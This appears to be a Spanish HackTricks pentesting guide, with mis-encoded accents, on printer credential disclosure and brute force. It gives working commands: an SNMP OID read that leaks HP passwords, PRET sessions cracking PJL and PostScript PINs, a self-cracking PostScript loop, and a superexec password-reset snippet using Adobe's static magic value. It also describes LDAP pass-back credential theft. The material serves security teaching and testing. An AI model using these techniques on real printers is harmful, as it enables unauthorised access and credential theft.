# DivulgaciÃ³n de Credenciales / Fuerza Bruta

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- ObtÃ©n la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Las impresoras suelen ser desplegadas con una **contraseÃ±a predeterminada o sin contraseÃ±a inicial**. En ambos casos, los usuarios finales o los administradores deben establecer activamente una contraseÃ±a para asegurar el dispositivo.

## DivulgaciÃ³n de ContraseÃ±a

### SNMP

Las antiguas impresoras HP tenÃ­an un OID vulnerable que devolvÃ­a la contraseÃ±a. Otros proveedores pueden tener problemas similares basados en SNMP.
```
snmpget -v1 -c public printer iso.3.6.1.4.1.11.2.3.9.1.1.13.0
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = Hex-STRING: 41 41 41 00 â€¦
```
### Pass-Back

Si la impresora estÃ¡ **autorizando a las personas usando un LDAP externo**. Si tienes acceso para **cambiar esta configuraciÃ³n** (tal vez usando una interfaz de consola web) puedes hacer que la impresora se conecte a tu servidor LDAP y autorizar a cualquier usuario.\
Ten en cuenta que tambiÃ©n podrÃ­as abusar de esta configuraciÃ³n para **robar las credenciales que la impresora estÃ¡ usando** para conectarse al servidor LDAP. [Lee aquÃ­ para aprender mÃ¡s](../../windows-hardening/active-directory-methodology/ad-information-in-printers.md).

## Brute-Force

### PJL

Las contraseÃ±as PJL son vulnerables a ataques de fuerza bruta debido a su limitado tamaÃ±o de clave de 16 bits. En menos de 30 minutos puedes adivinar la contraseÃ±a correcta.

Puedes usar los comandos `lock` y `unlock` de [PRET](https://github.com/RUB-NDS/PRET) para probar la fuerza bruta:
```
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> lock 999
PIN protection:  ENABLED
Panel lock:      ON
Disk lock:       ON
printer:/> unlock
No PIN given, cracking.
PIN protection:  DISABLED
Panel lock:      OFF
Disk lock:       OFF
```
### PostScript

PostScript ofrece dos tipos de contraseÃ±as: la `SystemParamsPassword` se utiliza para cambiar la configuraciÃ³n de trabajos de impresiÃ³n como el tamaÃ±o del papel, mientras que la `StartJobPassword` es necesaria para salir del bucle del servidor y, por lo tanto, alterar permanentemente el entorno de PostScript.

Los ataques de fuerza bruta contra las contraseÃ±as de PostScript se pueden realizar extremadamente rÃ¡pido porque el **intÃ©rprete de PostScript se puede programar para literalmente crackearse a sÃ­ mismo**:
```
/min 0 def /max 1000000 def
statusdict begin {
  min 1 max
  {dup checkpassword {== flush stop} {pop} ifelse} for
} stopped pop
```
Otro enfoque es **bypassear las contraseÃ±as de PostScript** restableciÃ©ndolas con el operador `superexec` propietario de Adobe. Este operador reside en el diccionario internaldict, que estÃ¡ "protegido" por una contraseÃ±a estÃ¡tica y mÃ¡gica (`1183615869`). Envolver el cÃ³digo PostScript en superexec permite a un atacante ignorar varios mecanismos de protecciÃ³n del lenguaje, que normalmente generarÃ­an un error de acceso invÃ¡lido. Esto se puede utilizar para establecer contraseÃ±as de PostScript sin enviar inicialmente la contraseÃ±a actual, como se muestra a continuaciÃ³n:
```
{ << /SystemParamsPassword (0)
     /StartJobPassword (0) >> setsystemparams
} 1183615869 internaldict /superexec get exec
```
Los comandos de bloqueo y desbloqueo de [PRET](https://github.com/RUB-NDS/PRET) se pueden utilizar para probar ataques de **fuerza bruta** contra contraseÃ±as PostScript numÃ©ricas (enteras) o para **burlarlas** con **magia superexec**:
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> lock 999
printer:/> unlock
No password given, cracking.
Device unlocked with password: 999
printer:/> lock S0me_Re4lly_g00d_Passw0rd!
printer:/> unlock bypass
Resetting password to zero with super-secret PostScript magic
Device unlocked with password: 0
```
**MÃ¡s informaciÃ³n sobre la divulgaciÃ³n de contraseÃ±as y el ataque de fuerza bruta en** [**http://hacking-printers.net/wiki/index.php/Credential\_disclosure**](http://hacking-printers.net/wiki/index.php/Credential\_disclosure)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- ObtÃ©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
